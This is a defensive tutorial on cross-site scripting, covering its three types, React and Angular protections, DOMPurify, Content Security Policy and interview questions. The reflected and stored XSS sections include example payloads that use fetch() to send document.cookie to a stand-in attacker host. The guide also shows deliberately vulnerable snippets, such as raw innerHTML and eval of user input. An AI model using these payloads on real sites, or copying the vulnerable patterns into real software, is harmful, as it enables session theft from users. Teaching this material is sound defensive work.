# XSS (Cross-Site Scripting)

## Overview

Cross-Site Scripting (XSS) is one of the most common web vulnerabilities, allowing attackers to inject malicious scripts into web pages viewed by other users. XSS can steal cookies, session tokens, credentials, and perform actions on behalf of victims. This guide covers all three types of XSS (Reflected, Stored, DOM-based), prevention strategies including sanitization and Content Security Policy (CSP), and framework-specific protections in React and Angular.

## Types of XSS Attacks

```
XSS Attack Flow:

1. Reflected XSS:
┌──────────────────────────────────────────────────────┐
│  Attacker → Crafts malicious URL                     │
│           → Victim clicks link                        │
│           → Server echoes input in response           │
│           → Script executes in victim's browser       │
└──────────────────────────────────────────────────────┘

2. Stored XSS:
┌──────────────────────────────────────────────────────┐
│  Attacker → Submits malicious data                   │
│           → Server stores in database                 │
│           → Victim views page                         │
│           → Malicious script loads from DB            │
│           → Script executes in victim's browser       │
└──────────────────────────────────────────────────────┘

3. DOM-Based XSS:
┌──────────────────────────────────────────────────────┐
│  Attacker → Crafts malicious URL                     │
│           → Victim clicks link                        │
│           → Client-side JS reads URL/input            │
│           → JS writes untrusted data to DOM           │
│           → Script executes (server never sees it)    │
└──────────────────────────────────────────────────────┘
```

### 1. Reflected XSS

Script reflected from the request in the response:

```typescript
// ❌ Vulnerable: Search functionality
// URL: /search?q=<script>alert('XSS')</script>

// Server-side (Express)
app.get('/search', (req, res) => {
  const query = req.query.q;
  // Dangerous: Directly embedding user input
  res.send(`<h1>Search results for: ${query}</h1>`);
  // Output: <h1>Search results for: <script>alert('XSS')</script></h1>
  // Script executes!
});

// ✅ Secure: Escape HTML
import escape from 'escape-html';

app.get('/search', (req, res) => {
  const query = escape(req.query.q);
  res.send(`<h1>Search results for: ${query}</h1>`);
  // Output: <h1>Search results for: &lt;script&gt;alert('XSS')&lt;/script&gt;</h1>
  // Script rendered as text, not executed
});

// Real-world attack example
const maliciousURL = `
  https://example.com/search?q=
  <script>
    fetch('https://attacker.com/steal?cookie=' + document.cookie)
  </script>
`;
```

### 2. Stored XSS

Malicious script stored in database and served to all users:

```typescript
// ❌ Vulnerable: Comment system
interface Comment {
  id: string;
  username: string;
  text: string;
}

// Attacker submits:
const maliciousComment = {
  username: 'Hacker',
  text: '<img src=x onerror="fetch(\'https://attacker.com/steal?cookie=\'+document.cookie)">'
};

// Server stores without sanitization
await db.comments.insert(maliciousComment);

// When any user views comments:
app.get('/comments', async (req, res) => {
  const comments = await db.comments.find();
  
  let html = '<div>';
  comments.forEach(comment => {
    // Dangerous: Renders malicious script
    html += `
      <div class="comment">
        <strong>${comment.username}</strong>
        <p>${comment.text}</p>
      </div>
    `;
  });
  html += '</div>';
  
  res.send(html);
  // Every user's cookies stolen!
});

// ✅ Secure: Sanitize on input AND output
import DOMPurify from 'isomorphic-dompurify';

app.post('/comments', async (req, res) => {
  const comment = {
    username: DOMPurify.sanitize(req.body.username),
    text: DOMPurify.sanitize(req.body.text)
  };
  
  await db.comments.insert(comment);
  res.json({ success: true });
});

app.get('/comments', async (req, res) => {
  const comments = await db.comments.find();
  
  // Still sanitize on output (defense in depth)
  const safeComments = comments.map(c => ({
    username: DOMPurify.sanitize(c.username),
    text: DOMPurify.sanitize(c.text)
  }));
  
  res.json(safeComments);
});
```

### 3. DOM-Based XSS

Vulnerability in client-side JavaScript:

```typescript
// ❌ Vulnerable: Reading from URL and writing to DOM
// URL: /#name=<img src=x onerror=alert('XSS')>

function displayWelcome() {
  const params = new URLSearchParams(window.location.hash.slice(1));
  const name = params.get('name');
  
  // Dangerous: innerHTML with untrusted data
  document.getElementById('welcome').innerHTML = `Welcome, ${name}!`;
  // <img> tag executes onerror handler
}

// Other dangerous sinks:
element.innerHTML = untrustedData;  // ❌
element.outerHTML = untrustedData;  // ❌
document.write(untrustedData);      // ❌
eval(untrustedData);                // ❌
setTimeout(untrustedData, 100);     // ❌
setInterval(untrustedData, 100);    // ❌
location.href = untrustedData;      // ❌ (javascript: URLs)
element.setAttribute('onclick', untrustedData); // ❌

// ✅ Secure: Use textContent or sanitize
function displayWelcomeSafe() {
  const params = new URLSearchParams(window.location.hash.slice(1));
  const name = params.get('name') || 'Guest';
  
  // Safe: textContent doesn't parse HTML
  document.getElementById('welcome').textContent = `Welcome, ${name}!`;
  
  // Or sanitize if HTML needed
  const sanitized = DOMPurify.sanitize(name);
  document.getElementById('welcome').innerHTML = `Welcome, ${sanitized}!`;
}
```

## React XSS Protection

React provides built-in XSS protection through JSX escaping:

### Built-in Protection

```typescript
// ✅ React automatically escapes JSX expressions
function UserProfile({ username }: { username: string }) {
  // Safe: Even if username contains "<script>alert('XSS')</script>"
  // React will escape it: &lt;script&gt;alert('XSS')&lt;/script&gt;
  return <div>Hello, {username}!</div>;
}

// ✅ Safe: Props are escaped
function Link({ href, text }: { href: string; text: string }) {
  return <a href={href}>{text}</a>;
  // href and text are safely escaped
}

// ❌ DANGEROUS: dangerouslySetInnerHTML bypasses protection
function UnsafeComponent({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
  // If html contains <script>, it will execute!
}

// ✅ Safe: Sanitize before dangerouslySetInnerHTML
import DOMPurify from 'dompurify';

function SafeComponent({ html }: { html: string }) {
  const sanitized = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

### Dangerous Patterns in React

```typescript
// ❌ DANGER: Direct DOM manipulation
function BadComponent() {
  const ref = useRef<HTMLDivElement>(null);
  
  useEffect(() => {
    if (ref.current) {
      // Bypasses React's protection!
      ref.current.innerHTML = userInput;
    }
  }, []);
  
  return <div ref={ref} />;
}

// ❌ DANGER: javascript: URLs
function BadLink({ url }: { url: string }) {
  // If url = "javascript:alert('XSS')", it executes!
  return <a href={url}>Click</a>;
}

// ✅ Safe: Validate URL protocol
function SafeLink({ url }: { url: string }) {
  const safeUrl = url.startsWith('http://') || url.startsWith('https://')
    ? url
    : '/';
  
  return <a href={safeUrl}>Click</a>;
}

// ❌ DANGER: Event handlers from strings
function BadButton({ onClick }: { onClick: string }) {
  // If onClick = "alert('XSS')", it executes!
  return <button onClick={eval(onClick)}>Click</button>;
}

// ✅ Safe: Use function props
function SafeButton({ onClick }: { onClick: () => void }) {
  return <button onClick={onClick}>Click</button>;
}
```

### React Sanitization Hook

```typescript
// useSanitizedHTML.ts
import { useMemo } from 'react';
import DOMPurify from 'dompurify';

interface SanitizeOptions {
  ALLOWED_TAGS?: string[];
  ALLOWED_ATTR?: string[];
  ALLOW_DATA_ATTR?: boolean;
}

export function useSanitizedHTML(
  dirty: string,
  options?: SanitizeOptions
): string {
  return useMemo(() => {
    const config = {
      ALLOWED_TAGS: options?.ALLOWED_TAGS || ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
      ALLOWED_ATTR: options?.ALLOWED_ATTR || ['href', 'title'],
      ALLOW_DATA_ATTR: options?.ALLOW_DATA_ATTR ?? false
    };
    
    return DOMPurify.sanitize(dirty, config);
  }, [dirty, options]);
}

// Usage
function RichTextDisplay({ content }: { content: string }) {
  const sanitized = useSanitizedHTML(content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
    ALLOWED_ATTR: ['href']
  });
  
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

### React Safe HTML Component

```typescript
// SafeHTML.tsx
import React from 'react';
import DOMPurify from 'dompurify';

interface SafeHTMLProps {
  html: string;
  allowedTags?: string[];
  allowedAttributes?: string[];
  className?: string;
}

export const SafeHTML: React.FC<SafeHTMLProps> = ({
  html,
  allowedTags,
  allowedAttributes,
  className
}) => {
  const sanitize = (dirty: string) => {
    const config: any = {};
    
    if (allowedTags) {
      config.ALLOWED_TAGS = allowedTags;
    }
    
    if (allowedAttributes) {
      config.ALLOWED_ATTR = allowedAttributes;
    }
    
    return DOMPurify.sanitize(dirty, config);
  };
  
  return (
    <div
      className={className}
      dangerouslySetInnerHTML={{ __html: sanitize(html) }}
    />
  );
};

// Usage
function BlogPost({ content }: { content: string }) {
  return (
    <SafeHTML
      html={content}
      allowedTags={['p', 'h1', 'h2', 'strong', 'em', 'a', 'ul', 'li', 'code', 'pre']}
      allowedAttributes={['href', 'title', 'class']}
      className="blog-content"
    />
  );
}
```

## Angular XSS Protection

Angular automatically sanitizes values before displaying them:

### Built-in Sanitization

```typescript
// ✅ Angular automatically sanitizes interpolation and property binding
@Component({
  selector: 'app-user-profile',
  template: `
    <!-- Safe: Angular escapes the value -->
    <div>{{ userInput }}</div>
    
    <!-- Safe: Property binding is sanitized -->
    <div [innerHTML]="userInput"></div>
    
    <!-- Safe: Angular sanitizes href -->
    <a [href]="userUrl">Link</a>
  `
})
export class UserProfileComponent {
  userInput = '<script>alert("XSS")</script>';
  // Rendered as: &lt;script&gt;alert("XSS")&lt;/script&gt;
  
  userUrl = 'javascript:alert("XSS")';
  // Angular blocks javascript: URLs
}

// Angular sanitizes these contexts:
// - HTML (innerHTML)
// - Style (style attribute)
// - URL (href, src)
// - Resource URL (script src, iframe src)
```

### Bypassing Sanitization (Dangerous)

```typescript
import { Component } from '@angular/core';
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';

@Component({
  selector: 'app-unsafe',
  template: `
    <div [innerHTML]="trustedHtml"></div>
  `
})
export class UnsafeComponent {
  trustedHtml: SafeHtml;
  
  constructor(private sanitizer: DomSanitizer) {
    const html = '<script>alert("XSS")</script>';
    
    // ❌ DANGEROUS: Bypasses Angular's sanitization
    this.trustedHtml = this.sanitizer.bypassSecurityTrustHtml(html);
    // Script will execute!
  }
}

// ✅ Safe: Sanitize first, then trust
import DOMPurify from 'dompurify';

@Component({
  selector: 'app-safe',
  template: `
    <div [innerHTML]="trustedHtml"></div>
  `
})
export class SafeComponent {
  trustedHtml: SafeHtml;
  
  constructor(private sanitizer: DomSanitizer) {
    const userInput = '<img src=x onerror="alert(\'XSS\')">';
    
    // First sanitize with DOMPurify
    const clean = DOMPurify.sanitize(userInput);
    
    // Then mark as trusted (now actually safe)
    this.trustedHtml = this.sanitizer.bypassSecurityTrustHtml(clean);
  }
}
```

### Angular Sanitization Service

```typescript
// sanitization.service.ts
import { Injectable } from '@angular/core';
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';
import DOMPurify from 'dompurify';

@Injectable({
  providedIn: 'root'
})
export class SanitizationService {
  constructor(private domSanitizer: DomSanitizer) {}
  
  sanitizeHtml(html: string, options?: any): SafeHtml {
    const clean = DOMPurify.sanitize(html, options);
    return this.domSanitizer.bypassSecurityTrustHtml(clean);
  }
  
  sanitizeUrl(url: string): string {
    // Only allow http(s) and relative URLs
    if (url.match(/^(https?:)?\/\//)) {
      return url;
    }
    if (url.startsWith('/')) {
      return url;
    }
    return '';
  }
  
  stripTags(html: string): string {
    return DOMPurify.sanitize(html, { ALLOWED_TAGS: [] });
  }
}

// Usage
@Component({
  selector: 'app-comment',
  template: `
    <div [innerHTML]="sanitizedComment"></div>
  `
})
export class CommentComponent implements OnInit {
  sanitizedComment: SafeHtml;
  
  constructor(private sanitization: SanitizationService) {}
  
  ngOnInit(): void {
    const userComment = this.getUserComment();
    
    this.sanitizedComment = this.sanitization.sanitizeHtml(userComment, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
      ALLOWED_ATTR: ['href']
    });
  }
  
  getUserComment(): string {
    // Get from API/input
    return '<b>Hello</b> <script>alert("XSS")</script>';
  }
}
```

## DOMPurify

DOMPurify is the industry-standard HTML sanitization library:

### Basic Usage

```typescript
import DOMPurify from 'dompurify';

// Basic sanitization
const dirty = '<img src=x onerror=alert("XSS")>';
const clean = DOMPurify.sanitize(dirty);
// Result: <img src="x">

// Configuration options
const config = {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href'],
  ALLOW_DATA_ATTR: false,
  ALLOW_UNKNOWN_PROTOCOLS: false,
  SAFE_FOR_TEMPLATES: true
};

const cleaned = DOMPurify.sanitize(dirty, config);
```

### Advanced Configuration

```typescript
// Custom sanitization rules
interface SanitizationConfig {
  level: 'strict' | 'moderate' | 'permissive';
  allowIframes?: boolean;
  allowDataAttributes?: boolean;
}

function createSanitizer(config: SanitizationConfig) {
  const baseConfig: any = {
    ALLOWED_URI_REGEXP: /^(?:(?:(?:f|ht)tps?|mailto|tel|callto|cid|xmpp):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
    FORBID_TAGS: ['style', 'form', 'input', 'button'],
    FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover']
  };
  
  switch (config.level) {
    case 'strict':
      return DOMPurify.sanitize.bind(DOMPurify, {
        ...baseConfig,
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
        ALLOWED_ATTR: []
      });
      
    case 'moderate':
      return DOMPurify.sanitize.bind(DOMPurify, {
        ...baseConfig,
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'a', 'ul', 'li', 'code', 'pre'],
        ALLOWED_ATTR: ['href', 'title']
      });
      
    case 'permissive':
      return DOMPurify.sanitize.bind(DOMPurify, {
        ...baseConfig,
        ALLOW_DATA_ATTR: config.allowDataAttributes,
        ADD_TAGS: config.allowIframes ? ['iframe'] : [],
        ADD_ATTR: config.allowIframes ? ['allow', 'allowfullscreen'] : []
      });
  }
}

// Usage
const strictSanitize = createSanitizer({ level: 'strict' });
const moderateSanitize = createSanitizer({ level: 'moderate' });

const userInput = '<a href="javascript:alert(\'XSS\')">Click</a>';
const cleaned = strictSanitize(userInput);
// Result: <a>Click</a> (href removed because it's dangerous)
```

### Hooks for Custom Behavior

```typescript
// Add custom sanitization logic
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  // Enforce rel="noopener noreferrer" on external links
  if (node.tagName === 'A') {
    const href = node.getAttribute('href');
    if (href && (href.startsWith('http://') || href.startsWith('https://'))) {
      node.setAttribute('rel', 'noopener noreferrer');
      node.setAttribute('target', '_blank');
    }
  }
  
  // Remove empty href attributes
  if (node.hasAttribute('href') && !node.getAttribute('href')) {
    node.removeAttribute('href');
  }
});

// Remove hook when done
DOMPurify.removeHook('afterSanitizeAttributes');
```

## Content Security Policy (CSP)

CSP is an HTTP header that controls which resources can be loaded:

### Basic CSP Header

```typescript
// Express.js middleware
import helmet from 'helmet';

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"], // ⚠️ unsafe-inline allows inline scripts
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.example.com"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"]
    }
  })
);

// Resulting header:
// Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; ...
```

### Strict CSP with Nonces

```typescript
// Generate unique nonce per request
import crypto from 'crypto';

app.use((req, res, next) => {
  // Generate random nonce
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});

app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    `
      default-src 'self';
      script-src 'self' 'nonce-${res.locals.nonce}';
      style-src 'self' 'nonce-${res.locals.nonce}';
      img-src 'self' https:;
      font-src 'self' https://fonts.gstatic.com;
      object-src 'none';
      base-uri 'self';
      form-action 'self';
      frame-ancestors 'none';
    `.replace(/\s+/g, ' ').trim()
  );
  next();
});

// In template, add nonce to inline scripts
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <script nonce="${res.locals.nonce}">
          // This script is allowed
          console.log('Loaded');
        </script>
        <script>
          // This script is BLOCKED (no nonce)
          alert('Blocked!');
        </script>
      </head>
      <body>Content</body>
    </html>
  `);
});
```

### React with CSP

```typescript
// next.config.js (Next.js)
const crypto = require('crypto');

module.exports = {
  async headers() {
    const nonce = crypto.randomBytes(16).toString('base64');
    
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: `
              default-src 'self';
              script-src 'self' 'nonce-${nonce}' 'strict-dynamic';
              style-src 'self' 'nonce-${nonce}';
              img-src 'self' data: https:;
              font-src 'self' data:;
              object-src 'none';
              base-uri 'self';
              form-action 'self';
              frame-ancestors 'none';
              upgrade-insecure-requests;
            `.replace(/\s+/g, ' ').trim()
          }
        ]
      }
    ];
  }
};

// _document.tsx
import { Html, Head, Main, NextScript } from 'next/document';

export default function Document() {
  const nonce = '...'; // Get from request context
  
  return (
    <Html>
      <Head nonce={nonce}>
        {/* Inline scripts with nonce */}
        <script
          nonce={nonce}
          dangerouslySetInnerHTML={{
            __html: `console.log('Allowed with nonce');`
          }}
        />
      </Head>
      <body>
        <Main />
        <NextScript nonce={nonce} />
      </body>
    </Html>
  );
}
```

## Common Mistakes

### 1. Using innerHTML with User Input

```typescript
// ❌ Bad
element.innerHTML = userInput;

// ✅ Good
element.textContent = userInput;
// Or
element.innerHTML = DOMPurify.sanitize(userInput);
```

### 2. Not Sanitizing Database Data

```typescript
// ❌ Bad: Assume database data is safe
const comment = await db.comments.findById(id);
return <div innerHTML={{ __html: comment.text }} />;

// ✅ Good: Sanitize even trusted sources (defense in depth)
const comment = await db.comments.findById(id);
const clean = DOMPurify.sanitize(comment.text);
return <div innerHTML={{ __html: clean }} />;
```

### 3. Trusting User-Controlled URLs

```typescript
// ❌ Bad
<a href={userUrl}>Link</a>

// ✅ Good
function isValidUrl(url: string): boolean {
  return url.startsWith('/') || 
         url.startsWith('http://') || 
         url.startsWith('https://');
}

<a href={isValidUrl(userUrl) ? userUrl : '/'}>Link</a>
```

### 4. Using eval or Function Constructor

```typescript
// ❌ Bad
eval(userInput);
new Function(userInput)();
setTimeout(userInput, 1000);

// ✅ Good: Never use eval with user input
// Use JSON.parse for data, not eval
```

### 5. Insufficient CSP

```typescript
// ❌ Bad: Too permissive
Content-Security-Policy: default-src *; script-src * 'unsafe-inline' 'unsafe-eval';

// ✅ Good: Restrictive with nonces
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}';
```

## Best Practices

1. **Never trust user input** - sanitize everything from users
2. **Use textContent over innerHTML** - when HTML not needed
3. **Sanitize with DOMPurify** - when HTML needed
4. **Implement CSP** - with nonces, no 'unsafe-inline'
5. **Validate URLs** - block javascript:, data:, vbscript: protocols
6. **Framework protections** - use React/Angular built-in escaping
7. **Defense in depth** - sanitize input AND output
8. **Avoid eval/Function** - never with user input
9. **Encode output contexts** - HTML, JS, URL, CSS separately
10. **Regular security audits** - test for XSS vulnerabilities

## When to Sanitize

### Always Sanitize:
- User-generated content
- URL parameters
- Form inputs
- Database data displayed to users
- External API responses
- File uploads (filenames, metadata)

### Before:
- Inserting into DOM (innerHTML, outerHTML)
- Using dangerouslySetInnerHTML (React)
- Bypassing Angular sanitization
- Rendering in templates

## Interview Questions

### 1. What is the difference between Reflected, Stored, and DOM-based XSS?

**Answer**: Reflected XSS occurs when user input is immediately echoed back in the response (e.g., search query in results). Stored XSS stores malicious script in a database, affecting all users who view it (e.g., malicious comment). DOM-based XSS happens entirely client-side when JavaScript reads untrusted input (URL, localStorage) and writes it to the DOM unsafely. Reflected and Stored involve server-side vulnerabilities, while DOM-based is purely client-side. Stored is most dangerous (persistent, affects many users), DOM-based is hardest to detect (server never sees payload).

### 2. How does React prevent XSS by default?

**Answer**: React automatically escapes all values embedded in JSX using `{}`. When you write `<div>{userInput}</div>`, React converts special characters to HTML entities (`<` becomes `&lt;`), preventing script execution. This applies to text content and attribute values. React's protection is bypassed by `dangerouslySetInnerHTML`, direct DOM manipulation via refs, or `javascript:` URLs in href attributes. Always sanitize before using dangerouslySetInnerHTML.

### 3. What is DOMPurify and why use it?

**Answer**: DOMPurify is an XSS sanitizer for HTML, MathML, and SVG. It parses HTML and removes dangerous elements/attributes while preserving safe content. Use it because: (1) Comprehensive - handles complex attack vectors, (2) Configurable - customize allowed tags/attributes, (3) Fast - optimized parsing, (4) Well-tested - used by Google, Microsoft, etc., (5) Framework-agnostic - works everywhere. It's the industry standard for HTML sanitization, recommended over regex or custom solutions which miss edge cases.

### 4. Explain Content Security Policy (CSP) and how it prevents XSS.

**Answer**: CSP is an HTTP header that defines which resources (scripts, styles, images) can load and execute. It prevents XSS by: (1) Blocking inline scripts (unless whitelisted with nonce), (2) Restricting script sources to trusted domains, (3) Disabling eval and Function constructor, (4) Controlling other resource types. Example: `script-src 'self' 'nonce-abc123'` only allows scripts from same origin or with specific nonce. Even if attacker injects `<script>`, it won't execute without the random nonce. CSP is defense-in-depth, not replacement for sanitization.

### 5. What are dangerous sinks in DOM-based XSS?

**Answer**: Dangerous sinks are JavaScript APIs that can execute code or parse HTML from untrusted input: `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout(string)`, `setInterval(string)`, `Function()`, `element.setAttribute('onclick', ...)`, `location.href = 'javascript:...'`, `element.insertAdjacentHTML()`. If user-controlled data flows into these without sanitization, XSS occurs. Use safe alternatives: `textContent` instead of `innerHTML`, callbacks instead of string event handlers, `JSON.parse` instead of `eval`.

### 6. How do you securely implement user-generated HTML content?

**Answer**:
1. Sanitize with DOMPurify before storing
2. Store sanitized version in database
3. Sanitize again on output (defense in depth)
4. Whitelist allowed tags/attributes
5. Use CSP with nonces
6. Validate on both client and server
7. Use framework protections (React JSX, Angular templates)
8. Implement input validation (length limits, character restrictions)
Never trust client-side sanitization alone - always sanitize server-side.

### 7. What are the risks of using 'unsafe-inline' in CSP?

**Answer**: `'unsafe-inline'` allows inline scripts/styles to execute, defeating CSP's main XSS protection. If attacker injects `<script>alert('XSS')</script>`, it executes despite CSP. It's needed for legacy code but removes security benefit. Alternatives: (1) Use nonces for inline scripts (`'nonce-random'`), (2) Move inline scripts to external files, (3) Use event handlers in JS not HTML, (4) Hash inline scripts (`'sha256-...'`). Only use unsafe-inline during migration, never in production. Modern CSP should use nonces or hashes exclusively.

### 8. How would you test for XSS vulnerabilities?

**Answer**:
1. Manual testing: Inject payloads in all inputs (`<script>alert('XSS')</script>`, `<img src=x onerror=alert(1)>`)
2. Automated scanning: OWASP ZAP, Burp Suite
3. Browser DevTools: Check if CSP violations logged
4. Code review: Search for dangerous patterns (innerHTML, eval, dangerouslySetInnerHTML)
5. Unit tests: Test sanitization functions with XSS payloads
6. Penetration testing: Hire security professionals
7. Bug bounty programs: Crowdsource vulnerability discovery
Test all input vectors: URL params, form fields, headers, cookies, localStorage, postMessage.

## Key Takeaways

1. **XSS allows attackers to execute malicious scripts** - stealing data, hijacking sessions
2. **Three types: Reflected, Stored, DOM-based** - each requires different mitigation
3. **Never trust user input** - sanitize everything from users, even database data
4. **Use textContent instead of innerHTML** - when HTML formatting not needed
5. **DOMPurify for HTML sanitization** - industry standard, configurable, well-tested
6. **React/Angular provide built-in XSS protection** - don't bypass without sanitization
7. **Implement strict CSP with nonces** - blocks inline scripts without proper nonce
8. **Dangerous sinks: innerHTML, eval, setTimeout(string)** - require special care
9. **Defense in depth** - sanitize input, validate, output encode, CSP, framework protections
10. **Regular security testing** - manual, automated, penetration testing, bug bounties

## Resources

- [XSS (Cross-Site Scripting) - OWASP](https://owasp.org/www-community/attacks/xss/)
- [DOMPurify](https://github.com/cure53/DOMPurify)
- [Content Security Policy (MDN)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [React Security](https://react.dev/learn/keeping-components-pure#detecting-impure-calculations-with-strict-mode)
- [Angular Security](https://angular.io/guide/security)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
